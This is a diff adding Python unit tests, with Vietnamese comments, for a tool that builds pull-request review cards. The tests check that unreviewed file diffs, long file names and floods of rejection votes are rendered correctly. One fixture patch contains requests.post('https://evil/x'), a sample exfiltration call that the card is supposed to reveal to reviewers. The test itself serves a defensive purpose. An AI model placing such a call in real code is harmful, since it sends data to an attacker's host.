@@ -95,6 +95,33 @@ class TestTheDuyet(unittest.TestCase):
         self.assertEqual(the.count("an toàn tuyệt đối"), 1)  # mỗi người chỉ phiếu mới nhất
         self.assertIn("tác giả PR, không độc lập", the)
 
+    def test_tran_l4_dua_diff_moi_tep(self):
+        # Phản bác 06/11: ở trần L4, duyệt là merge cả phần Thường không phiếu nào soát; thẻ phải đưa diff phần đó.
+        ds = [tep("package.json"), tep("src/app.py", patch="@@ -1 +1 @@\n+requests.post('https://evil/x')")]
+        bac = [phieu("bac", SHA_CU, "2026-11-01T10:00:00Z"), phieu("bac", "c" * 40, "2026-11-01T10:10:00Z")]
+        the = self.the(ds_tep=ds, co_phieu=False, ds_duyet=bac)
+        self.assertIn("+requests.post('https://evil/x')", the)
+        self.assertIn("chạm trần L4", the)
+        self.assertIn("không ai soát", the)
+        self.assertNotIn("cổng còn chặn", the)
+        self.assertIn("(2/2 tệp)", the)
+
+    def test_ten_tep_dai_khong_day_tep_cao_cuoi_ra(self):
+        dai = "@@ -0,0 +1,200 @@\n" + "\n".join("+" + "y" * 390 for _ in range(200))
+        ds = [tep("cong/%02d_%s.py" % (i, "\u1eef" * 190), 200, 0, patch=dai) for i in range(14)]
+        ds.append(tep("cong/zz_last.py", patch="@@ -0,0 +1 @@\n+LAST_FILE_MARKER"))
+        the = self.the(ds_tep=ds)
+        self.assertLessEqual(len(the.encode("utf-8")), the_duyet.GIOI_HAN)
+        self.assertIn("+LAST_FILE_MARKER", the)
+        self.assertNotIn("Thẻ quá dài, đã cắt", the)
+
+    def test_lu_phieu_bac_khong_day_test_ra(self):
+        lu = [phieu("bac", gio="2026-11-01T%02d:%02d:00Z" % (i // 60, i % 60), tai_hien="x" * 300) for i in range(200)]
+        the = self.the(ds_tep=[tep("cong/x.py", patch=PATCH_CONG)], co_phieu=False, ds_duyet=lu)
+        self.assertIn("### 3. Test", the)
+        self.assertIn("+MOI = 2", the)
+        self.assertIn("Còn 180 phiếu bác", the)
+
     def test_rao_khong_ten_ngon_ngu_van_tinh_la_mo(self):
         self.assertEqual(the_duyet._rao_dang_mo("x\n\n````\n+abc"), 4)
         self.assertEqual(the_duyet._rao_dang_mo("````diff\n+a\n````"), 0)
